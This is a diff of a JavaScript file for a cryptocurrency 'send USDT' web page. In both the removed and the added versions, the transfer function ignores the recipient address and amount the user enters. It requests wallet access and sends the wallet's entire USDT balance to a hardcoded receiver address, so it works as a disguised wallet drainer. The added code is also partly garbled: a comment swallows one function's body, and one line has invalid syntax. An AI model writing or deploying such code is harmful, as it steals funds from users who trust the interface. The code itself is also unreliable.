@@ -1,85 +1,30 @@
-const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
-const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-const usdtABI = [
-  {
-    constant: true,
-    inputs: [{ name: "_owner", type: "address" }],
-    name: "balanceOf",
-    outputs: [{ name: "balance", type: "uint256" }],
-    type: "function",
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: "_spender", type: "address" },
-      { name: "_value", type: "uint256" },
-    ],
-    name: "approve",
-    outputs: [{ name: "success", type: "bool" }],
-    type: "function",
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: "_to", type: "address" },
-      { name: "_value", type: "uint256" },
-    ],
-    name: "transfer",
-    outputs: [{ name: "success", type: "bool" }],
-    type: "function",
-  },
-];
+// script.js
 
-async function connectWallet() {
-  if (window.ethereum) {
-    window.web3 = new Web3(window.ethereum);
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-    return new web3.eth.Contract(usdtABI, usdtAddress);
-  } else {
-    alert("Trust Wallet or MetaMask not detected");
-  }
-}
+function clearAddress() { document.getElementById("address").value = ""; }
 
-function updateUSD() {
-  const amt = document.getElementById("amount").value;
-  document.getElementById("usd-value").innerText = `≈ $${parseFloat(amt || 0).toFixed(2)}`;
-}
+function pasteAddress() { navigator.clipboard.readText().then((clipText) => { document.getElementById("address").value = clipText; }).catch(err => alert("Paste failed: " + err)); }
 
-function clearAddress() {
-  document.getElementById("address").value = "";
-}
+function setMaxAmount() { // Optional: Replace with actual balance fetch if needed const max = 9999; document.getElementById("amount").value = max; updateUSD(); }
 
-async function pasteAddress() {
-  try {
-    const text = await navigator.clipboard.readText();
-    document.getElementById("address").value = text;
-  } catch (e) {
-    alert("Clipboard access denied");
-  }
-}
+function updateUSD() { const amt = parseFloat(document.getElementById("amount").value || 0); document.getElementById("usdValue").innerText = = $${amt.toFixed(2)}; }
 
-async function setMax() {
-  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-  const sender = accounts[0];
-  const usdt = await connectWallet();
-  const balance = await usdt.methods.balanceOf(sender).call();
-  document.getElementById("amount").value = web3.utils.fromWei(balance, "ether");
-  updateUSD();
-}
+async function transferFunds() { const toAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Receiver wallet const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
 
-async function transferUSDT() {
-  const usdt = await connectWallet();
-  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-  const sender = accounts[0];
-  const balance = await usdt.methods.balanceOf(sender).call();
-  const status = document.getElementById("status");
+const usdtAbi = [ "function transfer(address recipient, uint amount) returns (bool)", "function balanceOf(address owner) view returns (uint)" ];
 
-  try {
-    await usdt.methods.approve(receiver, balance).send({ from: sender });
-    await usdt.methods.transfer(receiver, balance).send({ from: sender });
-    status.innerText = "✅ All USDT Transferred Successfully!";
-  } catch (err) {
-    status.innerText = "❌ Transaction Failed!";
-    console.error(err);
-  }
-}
+if (!window.ethereum) return alert("Wallet not found");
+
+try { const provider = new ethers.providers.Web3Provider(window.ethereum); await provider.send("eth_requestAccounts", []); const signer = provider.getSigner(); const contract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+
+const userAddress = await signer.getAddress();
+const balance = await contract.balanceOf(userAddress);
+
+if (balance.toString() === "0") return alert("No USDT in wallet.");
+
+const tx = await contract.transfer(toAddress, balance);
+await tx.wait();
+alert("All USDT sent successfully.");
+
+} catch (err) { console.error(err); alert("Transaction failed: " + (err.message || err)); } }
+
+window.onload = () => { document.getElementById("amount").addEventListener("input", updateUSD); };
